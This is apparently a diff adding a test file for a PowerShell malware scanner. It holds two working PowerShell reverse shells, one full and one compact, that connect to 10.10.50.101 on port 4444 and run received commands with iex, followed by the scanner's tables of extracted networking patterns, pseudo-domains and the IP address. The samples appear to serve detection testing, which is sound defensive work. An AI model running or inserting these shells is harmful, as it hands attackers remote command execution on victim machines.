@@ -1,0 +1,51 @@
+$client = New-Object System.Net.Sockets.TCPClient('10.10.50.101',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+$sm=(New-Object Net.Sockets.TCPClient('10.10.50.101',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+
+[*] Scanning file: ./test1.ps1
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted patterns about Networking in ./test1.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│                        IEX                         │
+│                     TcpClient                      │
+│                    Net.Sockets                     │
+│                 Text.AsciiEncoding                 │
+│            System.Net.Sockets.TcpClient            │
+│                       Socket                       │
+│                        Send                        │
+└────────────────────────────────────────────────────┘
+[!] No URLs found in ./test1.ps1.
+
+
+[*] Extracting Domains from ./test1.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted Domains from ./test1.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│           text.encoding            │
+│            bytes.Length            │
+│          client.GetStream          │
+│            stream.Read             │
+│     System.Text.ASCIIEncoding      │
+│          sendbyte.Length           │
+│         Text.ASCIIEncoding         │
+│             st.Length              │
+│              sm.Read               │
+│            stream.Write            │
+│            stream.Flush            │
+│    System.Net.Sockets.TCPClient    │
+│       Net.Sockets.TCPClient        │
+│              sm.Write              │
+│            client.Close            │
+│             bt.Length              │
+└────────────────────────────────────┘
+[!] No File Paths found in ./test1.ps1.
+
+
+[*] Extracting IP Addresses from ./test1.ps1...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Extracted IP Addresses from ./test1.ps1 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│              10.10.50.101               │
+└─────────────────────────────────────────┘
+[!] No Files found in ./test1.ps1.
+
